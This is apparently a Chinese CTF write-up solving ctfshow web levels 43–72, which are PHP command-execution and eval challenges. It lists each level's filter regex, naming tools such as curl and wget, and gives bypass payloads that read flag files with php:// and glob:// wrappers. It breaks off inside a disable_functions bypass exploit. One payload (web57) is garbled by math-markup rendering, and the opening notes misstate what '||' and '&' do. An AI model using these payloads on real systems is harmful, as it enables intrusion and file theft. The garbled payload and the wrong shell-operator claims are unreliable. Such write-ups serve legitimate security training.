 <p>/dev/null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显<br> ; 分号<br> | 只执行后面那条命令<br> || 只执行前面那条命令<br> &amp; 两条命令都会执行<br> &amp;&amp; 两条命令都会执行</p> 
</blockquote> 
<h5><a id="web43_420"></a>web43</h5> 
<p>多过滤了cat,\和；，使用其他Payload即可</p> 
<h5><a id="web44_424"></a>web44</h5> 
<p>多过滤了flag，使用fla*即可</p> 
<h5><a id="web45_428"></a>web45</h5> 
<p>过滤了空格，使用$IFS或者%09绕过即可</p> 
<h5><a id="web46_432"></a>web46</h5> 
<p>过滤了$和*，Payload如下：</p> 
<blockquote> 
 <p>1、?c=nl&lt;fla’'g.php||</p> 
 <p>2、?c=ca\t&lt;fl\ag.php||</p> 
</blockquote> 
<h5><a id="web47_440"></a>web47</h5> 
<pre><code class="prism language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
</code></pre> 
<p>Payload:</p> 
<blockquote> 
 <p>tac%09fl’'ag.php||</p> 
 <p>…</p> 
</blockquote> 
<h5><a id="web48_452"></a>web48</h5> 
<pre><code class="prism language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
</code></pre> 
<p>多过滤了一些函数，不过之前Payload可以继续打</p> 
<h5><a id="web49_460"></a>web49</h5> 
<pre><code class="prism language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
</code></pre> 
<p>过滤了%，但是可以&lt;</p> 
<h5><a id="web50_468"></a>web50</h5> 
<pre><code class="prism language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
</code></pre> 
<p>同上</p> 
<h5><a id="web51_476"></a>web51</h5> 
<pre><code class="prism language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
</code></pre> 
<p>ban了tac但是可以用nl</p> 
<h5><a id="web52_484"></a>web52</h5> 
<p>ban了&lt;&gt;，但是可以用$IFS,而且这次flag放在了根目录</p> 
<p>Payload:</p> 
<blockquote> 
 <p>?c=nl$IFS/fl’'ag||</p> 
</blockquote> 
<h5><a id="web53_492"></a>web53</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>Payload:</p> 
<blockquote> 
 <p>1、?c=ta’‘c${IFS}f’'lag.php</p> 
 <p>2、s’'ort${IFS}f???%0a</p> 
</blockquote> 
<h5><a id="web54_510"></a>web54</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>Payload:</p> 
<blockquote> 
 <p>1、?c=/bin/?at${IFS}f???</p> 
 <p>2、mv flag.php t.txt</p> 
</blockquote> 
<h5><a id="web55_524"></a>web55(无数字字母的命令执行)</h5> 
<pre><code class="prism language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
</code></pre> 
<p>过滤了所有字母</p> 
<p><img src="https://images2.imgbox.com/98/1f/vIESBsDz_o.png" alt="在这里插入图片描述"></p> 
<p>利用post上传文件，然后使用.(source)执行，一般上传后文件在/tmp/php???[@-[]</p> 
<h5><a id="web56_542"></a>web56</h5> 
<p>方法同上</p> 
<h5><a id="web57_546"></a>web57(取反)</h5> 
<pre><code class="prism language-php"><span class="token comment">//flag in 36.php </span>
<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span>
</code></pre> 
<p>过滤了字母数字</p> 
<p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p> 
<p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p> 
<p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p> 
<p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p> 
<p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36</p> 
<p>Payload:</p> 
<blockquote> 
 <p>?c=<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>((<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          ( 
         
        
          ( 
         
        
            
         
        
       
         ((~ 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">((</span><span class="mspace nobreak"> </span></span></span></span></span>(())))))))</p> 
</blockquote> 
<h5><a id="web58_569"></a>web58</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>Payload:</p> 
<blockquote> 
 <p>1、c=show_source(‘flag.php’);</p> 
 <p>2、c=highlight_file(“flag.php”);</p> 
 <p>3、c=include($_POST[‘w’]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</p> 
 <p>4、c=include(“flag.php”);var_dump(get_defined_vars());</p> 
</blockquote> 
<h5><a id="web59_588"></a>web59</h5> 
<p>Payload同上</p> 
<h5><a id="web60_592"></a>web60</h5> 
<p>Payload同上</p> 
<h5><a id="web61_596"></a>web61</h5> 
<p>Payload同上</p> 
<h5><a id="web62_600"></a>web62</h5> 
<p>Payload同上，不过ban了highlight_file函数</p> 
<h5><a id="web63_604"></a>web63</h5> 
<p>Payload同上</p> 
<h5><a id="web64_608"></a>web64</h5> 
<p>Payload同上</p> 
<h5><a id="web65_612"></a>web65</h5> 
<p>ban了show_source,然后使用php伪协议读取flag.php时，源码显示flag不在这，于是使用data协议读取根目录看到flag.txt</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/12/4c/Vo7HpdPJ_o.png" alt="在这里插入图片描述"></p> 
<p>因为大部分直接可以命令执行的函数被ban了，看了wp没想到highlight_file没被ban</p> 
<h5><a id="web66_627"></a>web66</h5> 
<p>Payload同上</p> 
<h5><a id="web67_631"></a>web67</h5> 
<p>highlight_file被ban了，但是可以直接用php伪协议读取</p> 
<h5><a id="web68_635"></a>web68</h5> 
<p>Payload同上</p> 
<p>implode：把数组元素组合为字符串</p> 
<p>冷门函数：读取函数readgzfile：可以读取非gz格式的文件</p> 
<p>Payload：</p> 
<blockquote> 
 <p>1、?c=echo(implode(‘—’,scandir(“/”)));</p> 
 <p>2、?c=readgzfile(‘/flag.txt’);</p> 
</blockquote> 
<h5><a id="web69_649"></a>web69</h5> 
<p>虽然有几个报错但是flag还是出来了</p> 
<h5><a id="web70_653"></a>web70</h5> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>虽然php伪协议可以读，但是结果把数字字母替换了，但是可以执行php代码让后面的匹配缓冲区不执行直接退出exit或die</p> 
<p>Payload:</p> 
<blockquote> 
 <p>c=readgzfile(‘/flag.txt’);exit(0);</p> 
 <p>c=include(‘/flag.txt’);exit(0);</p> 
</blockquote> 
<h5><a id="web71_675"></a>web71</h5> 
<p>Payload同上</p> 
<h5><a id="web72globwaf_679"></a>web72(glob协议+waf绕过)</h5> 
<p>flag不在/下了，但是很多查询的函数被ban了</p> 
<p>使用glob://伪协议绕过open_basedir</p> 
<p>glob可以遍历目录，并且不受disable_functions的限制。</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token operator">?</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://./*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
   <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>仔细看看这个代码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
	<span class="token comment"># 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span>
	<span class="token comment"># glob:// — 查找匹配的文件路径模式</span>
	<span class="token comment"># DirectoryIterator("glob:///*")   遍历根目录里所有文件</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>  	<span class="token comment">#循环遍历输出，并以空格为分隔</span>
<span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<p>其实不加前面<code>?&gt;&lt;?php</code>也是可以的。eval里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以<code>;</code>或者<code>?&gt;</code>结尾来结束语句，但是eval里的?&gt;不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。</p> 
<p>可以看一下下面的图片，eval里的语句可以修改文件的变量值，但是<code>?&gt;</code>并不会闭合外面的PHP语句。<br> <img src="https://images2.imgbox.com/75/ab/KUG605yh_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
        <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span> 
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
